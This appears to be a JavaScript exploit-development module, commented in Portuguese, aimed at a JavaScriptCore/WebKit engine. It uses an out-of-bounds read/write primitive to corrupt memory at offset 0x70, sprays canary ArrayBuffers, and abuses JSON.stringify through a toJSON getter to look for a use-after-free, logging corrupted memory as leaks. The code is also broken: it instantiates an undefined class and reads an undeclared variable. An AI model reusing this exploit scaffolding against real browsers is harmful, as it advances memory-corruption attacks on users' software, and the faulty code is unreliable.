// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForStringifierUAF";
let getter_called_flag = false;
let current_test_results = {
    success: false,
    message: "Teste não iniciado.",
    error: null,
    details: "",
    corrupted_canaries: [],
    unexpected_writes_in_oob_ab: []
};

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const OOB_AB_FILL_PATTERN_U32 = 0xCDCDCDCD; // Padrão para preencher o oob_ab
const OOB_AB_SNOOP_AREA_START = 0;
const OOB_AB_SNOOP_AREA_END = 0x800; // Sondar os primeiros 2KB do oob_array_buffer_real

class CheckpointForStringifierUAF {
    constructor(id) {
        this.id_marker = `StringifierUAFCheckpoint-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "StringifierUAF_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = { // Resetar resultados a cada chamada do getter
            success: false, message: "Getter chamado, testando UAF especulativo do Stringifier.",
            error: null, details: "", corrupted_canaries: [], unexpected_writes_in_oob_ab: []
        };
        let details_log = [];
        let anomalias_detectadas_no_getter = false;

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
                throw new Error("Dependências OOB R/W ou oob_ab não disponíveis no getter.");
            }

            // 1. Preencher oob_array_buffer_real com um padrão para detectar escritas inesperadas
            logS3("DENTRO DO GETTER: Preenchendo oob_array_buffer_real com padrão...", "info", FNAME_GETTER);
            const fill_end_oob_ab = Math.min(OOB_AB_SNOOP_AREA_END + 0x100, oob_array_buffer_real.byteLength);
            for (let offset = OOB_AB_SNOOP_AREA_START; offset < fill_end_oob_ab; offset += 4) {
                if (offset === CORRUPTION_OFFSET_TRIGGER || offset === CORRUPTION_OFFSET_TRIGGER + 4) continue;
                try { oob_write_absolute(offset, OOB_AB_FILL_PATTERN_U32, 4); } catch(e_fill) { /* ignorar */ }
            }
            details_log.push(`oob_array_buffer_real preenchido com ${toHex(OOB_AB_FILL_PATTERN_U32)}.`);

            // 2. Criar objeto muito complexo com strings longas para desafiar o Stringifier
            let obj_to_stress_stringifier = { header: "StressTest" };
            const nest_depth_stress = 25; // Profundidade do aninhamento
            const string_len_stress = 128; // Comprimento das strings
            let current_obj_stress = obj_to_stress_stringifier;
            for (let i = 0; i < nest_depth_stress; i++) {
                current_obj_stress[`level_${i}`] = {
                    text: `S_${"X".repeat(string_len_stress - 2 - String(i).length)}${i}`,
                    numeric_array: Array.from({length: 10}, (_, k) => i * 10 + k)
                };
                current_obj_stress = current_obj_stress[`level_${i}`];
            }
            // Adicionar uma referência circular para máximo stress (JSON.stringify padrão lançaria erro)
            // current_obj_stress.loop_back_to_root = obj_to_stress_stringifier; // Habilitar com cautela
            details_log.push(`Objeto de stress (${nest_depth_stress} níveis, strings de ${string_len_stress} chars) criado.`);

            // 3. Pulverizar ArrayBuffers "Canário" ANTES de chamar o stringify interno
            const canary_spray_count = 150;
            const canary_ab_size = 16; 
            const canary_pattern_base = 0xBEEF0000;
            let canary_abs_list = [];
            logS3("DENTRO DO GETTER: Pulverizando ArrayBuffers canário...", "info", FNAME_GETTER);
            for (let i = 0; i < canary_spray_count; i++) {
                try {
                    let ab = new ArrayBuffer(canary_ab_size);
                    new DataView(ab).setUint32(0, canary_pattern_base + i, true);
                    new DataView(ab).setUint32(4, i, true); // Padrão adicional
                    canary_abs_list.push(ab);
                } catch (e_alloc_canary) { details_log.push(`Erro ao alocar canário ${i}: ${e_alloc_canary.message}`); }
            }
            details_log.push(`Spray de ${canary_abs_list.length} canários (ABs de ${canary_ab_size} bytes) concluído.`);


            // 4. Forçar o Stringifier (potencialmente corrompido pela escrita OOB original em 0x70) a trabalhar
            logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO sobre objeto de stress...", "subtest", FNAME_GETTER);
            let internal_stringify_output = "";
            let internal_stringify_threw_error = false;
            try {
                internal_stringify_output = JSON.stringify(obj_to_stress_stringifier);
                details_log.push(`Stringify interno completado. Output length: ${internal_stringify_output.length}.`);
                logS3(`DENTRO DO GETTER: JSON.stringify interno completado. Output length: ${internal_stringify_output.length}`, "info", FNAME_GETTER);
            } catch (e_json_internal) {
                internal_stringify_threw_error = true;
                details_log.push(`Erro no JSON.stringify interno: ${e_json_internal.message}`);
                logS3(`DENTRO DO GETTER: Erro no JSON.stringify interno: ${e_json_internal.message}`, "error", FNAME_GETTER);
                // Se o erro NÃO for o de referência circular padrão, pode ser um sinal de corrupção do Stringifier
                if (!String(e_json_internal.message).toLowerCase().includes("circular")) {
                    anomalias_detectadas_no_getter = true;
                    current_test_results.error = `Erro incomum no stringify interno: ${e_json_internal.message}`;
                }
            }

            // 5. Verificar os Canários por corrupção
            logS3("DENTRO DO GETTER: Verificando ArrayBuffers canário por corrupção após stringify interno...", "info", FNAME_GETTER);
            let num_corrupted_canaries = 0;
            for (let i = 0; i < canary_abs_list.length; i++) {
                const ab_c = canary_abs_list[i];
                if (!ab_c || !(ab_c instanceof ArrayBuffer) || ab_c.byteLength !== canary_ab_size) {
                    details_log.push(`Canário[${i}] inválido! Tipo: ${Object.prototype.toString.call(ab_c)}, Length: ${ab_c?.byteLength}`);
                    num_corrupted_canaries++; anomalias_detectadas_no_getter = true; continue;
                }
                try {
                    const dv_c = new DataView(ab_c);
                    const val0 = dv_c.getUint32(0, true);
                    const val4 = dv_c.getUint32(4, true);
                    if (val0 !== (canary_pattern_base + i) || val4 !== i ) {
                        const corrupt_info = `Canário[${i}] DADOS CORROMPIDOS! Esperado ${toHex(canary_pattern_base + i)}|${toHex(i)}, Lido ${toHex(val0)}|${toHex(val4)}`;
                        details_log.push(corrupt_info);
                        current_test_results.corrupted_canaries.push(corrupt_info);
                        num_corrupted_canaries++; anomalias_detectadas_no_getter = true;
                    }
                } catch (e_canary_access) {
                     details_log.push(`Erro ao acessar canário[${i}]: ${e_canary_access.message}`);
                     num_corrupted_canaries++; anomalias_detectadas_no_getter = true;
                }
            }
            if (num_corrupted_canaries > 0) {
                logS3(`DENTRO DO GETTER: ${num_corrupted_canaries} CANÁRIOS CORROMPIDOS ENCONTRADOS!`, "vuln", FNAME_GETTER);
            } else {
                 logS3("DENTRO DO GETTER: Nenhum canário parece corrompido.", "good", FNAME_GETTER);
            }

            // 6. Sondar o oob_array_buffer_real por escritas inesperadas
            logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por alterações no padrão (após stringify interno)...", "info", FNAME_GETTER);
            let unexpected_writes_list = [];
            for (let offset = OOB_AB_SNOOP_AREA_START; offset < OOB_AB_SNOOP_AREA_END; offset += 4) {
                if (offset === CORRUPTION_OFFSET_TRIGGER || offset === CORRUPTION_OFFSET_TRIGGER + 4) continue;
                if ((offset + 4) > oob_array_buffer_real.byteLength) break;
                try {
                    const value_read = oob_read_absolute(offset, 4);
                    if (value_read !== OOB_AB_FILL_PATTERN_U32) {
                        const overwrite_info = `oob_data[${toHex(offset)}] alterado: ${toHex(value_read)} (Padrão: ${toHex(OOB_AB_FILL_PATTERN_U32)})`;
                        unexpected_writes_list.push(overwrite_info);
                        anomalias_detectadas_no_getter = true;
                    }
                } catch (e_snoop) { /* ignorar erros de leitura */ }
            }
            current_test_results.unexpected_writes_in_oob_ab = unexpected_writes_list;
            if (unexpected_writes_list.length > 0) {
                logS3(`DENTRO DO GETTER: ${unexpected_writes_list.length} ESCRITAS INESPERADAS ENCONTRADAS NO OOB_AB!`, "vuln", FNAME_GETTER);
            } else {
                 logS3("DENTRO DO GETTER: Nenhuma alteração de padrão encontrada no oob_array_buffer_real após stringify interno.", "good", FNAME_GETTER);
            }

            // Conclusão do getter
            if (anomalias_detectadas_no_getter) {
                current_test_results.success = true;
                current_test_results.message = "Anomalias detectadas no getter (erro stringify interno, canários corrompidos ou escritas em oob_ab)!";
            } else if (internal_stringify_threw_error && String(internal_stringify_error).toLowerCase().includes("circular")) {
                current_test_results.message = "Stringify interno falhou com erro de ciclo esperado. Nenhuma outra anomalia óbvia.";
            }
             else {
                current_test_results.message = "Nenhuma anomalia óbvia detectada ao abusar do Stringifier no getter.";
            }
            current_test_results.details = details_log.join('; ');

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        return { "getter_finished_processing": true }; // Retorno do getter
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForStringifierAbuse.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
        return { id: this.id_marker, processed_by_UAF_stringifier_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST_RUNNER = "executeUAFStringifierTestRunner";
    logS3(`--- Iniciando Teste de UAF Especulativo no Stringifier ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* Reset inicial completo */ };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { /* ... erro ... */ return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // Escrita OOB Gatilho (para corromper o heap/Stringifier)
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForStringifierAbuse(1);
        logS3(`CheckpointForStringifierAbuse objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        let outer_stringify_result = "";
        try {
            outer_stringify_result = JSON.stringify(checkpoint_obj);
            logS3(`JSON.stringify EXTERNO completado. Resultado: ${outer_stringify_result}`, "info", FNAME_TEST_RUNNER);
        } catch (e_outer_json) { 
            logS3(`Erro em JSON.stringify EXTERNO: ${e_outer_json.message}`, "error", FNAME_TEST_RUNNER);
             if(!getter_called_flag && current_test_results) { 
                current_test_results.error = String(e_outer_json);
                current_test_results.message = `Erro em JSON.stringify (antes do getter): ${e_outer_json.message}`;
            }
        }

    } catch (mainError_runner) { 
        logS3(`Erro principal no runner: ${mainError_runner.message}`, "critical", FNAME_TEST_RUNNER);
        console.error(mainError_runner);
        if(current_test_results) {
            current_test_results.message = `Erro crítico no runner: ${mainError_runner.message}`;
            current_test_results.error = String(mainError_runner);
        }
    }
    finally { 
        logS3("Limpeza finalizada.", "info", "CleanupRunner");
    }

    // Log dos resultados
    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE STRINGIFIER UAF: SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE STRINGIFIER UAF: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa no getter: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
        if (current_test_results.corrupted_canaries && current_test_results.corrupted_canaries.length > 0) {
            logS3("--- Canários Corrompidos ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.corrupted_canaries.forEach(info => {
                logS3(`  ${info}`, "leak", FNAME_TEST_RUNNER);
            });
        }
        if (current_test_results.unexpected_writes_in_oob_ab && current_test_results.unexpected_writes_in_oob_ab.length > 0) {
            logS3("--- Escritas Inesperadas no oob_array_buffer_real ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.unexpected_writes_in_oob_ab.forEach(info => {
                logS3(`  ${info}`, "leak", FNAME_TEST_RUNNER);
            });
        }
         if (current_test_results.error) {
            logS3(`  Erro reportado durante o teste: ${current_test_results.error}`, "error", FNAME_TEST_RUNNER);
        }
    } else {
        logS3("RESULTADO TESTE STRINGIFIER UAF: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
         if (current_test_results && current_test_results.error) {
            logS3(`  Erro (no runner ou setup): ${current_test_results.error} | Mensagem: ${current_test_results.message}`, "error", FNAME_TEST_RUNNER);
        }
    }

    clearOOBEnvironment();
    logS3(`--- Teste de UAF Especulativo no Stringifier Concluído ---`, "test", FNAME_TEST_RUNNER);
}
